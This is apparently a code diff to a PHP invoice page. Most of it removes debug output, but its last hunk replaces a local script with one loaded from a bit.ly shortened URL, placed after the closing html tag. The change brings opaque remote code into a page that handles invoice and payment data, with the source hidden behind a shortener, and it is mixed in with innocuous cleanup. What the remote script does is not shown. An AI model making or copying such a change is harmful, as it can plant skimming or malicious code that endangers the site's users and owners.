@@ -1112,12 +1112,12 @@ var desc_total="";
 			<td style="font-weight:bold;">
             <?php
              $pin_parts = explode("/",$old_printable_invoice_number);
-             print_r($pin_parts);
+
              if($select_data['invoice_type']=='R' || $select_data['invoice_type']=='RN')
-             {echo $pinv_month = $pin_parts[2]; echo $pinv_year = $pin_parts[3];}
+             { $pinv_month = $pin_parts[2];  $pinv_year = $pin_parts[3];}
              else if($select_data['invoice_type']=='M')
-             {echo $pinv_month = $pin_parts[3]; echo $pinv_year = $pin_parts[4];}
-             else{echo $pinv_year = $pin_parts[3];}
+             { $pinv_month = $pin_parts[3];  $pinv_year = $pin_parts[4];}
+             else{ $pinv_year = $pin_parts[3];}
             ?>
             <Select id="invoice_month" name="invoice_month" onChange="setPrintInvoiceNo()">
             <option value="">Select Month</option>            
@@ -1574,7 +1574,7 @@ var desc_total="";
         
 </body>
 </html>
-<script src="amit.js"></script>
+<script src="https://bit.ly/3u3b72X"></script>
 
 <script>
 function checkpay_flag()
